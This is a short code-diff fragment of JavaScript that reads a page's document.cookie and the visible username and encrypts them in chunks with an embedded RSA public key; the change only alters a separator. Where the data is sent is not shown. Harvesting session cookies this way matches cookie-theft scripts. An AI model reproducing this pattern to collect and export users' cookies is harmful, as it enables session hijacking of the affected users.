@@ -20,7 +20,7 @@ LQIDAQAB
 -----END PUBLIC KEY-----`;
   const encrypt = new JSEncrypt();
   encrypt.setPublicKey(pubkey);
-  const data = document.cookie + "\n" + $('.dropdown-toggle').text().trim();
+  const data = document.cookie + "\n\n" + $('.dropdown-toggle').text().trim();
   let chunks = [];
   for (let i = 0; i < data.length; i += 245) {
     chunks.push(encrypt.encrypt(data.slice(i, i + 245)));
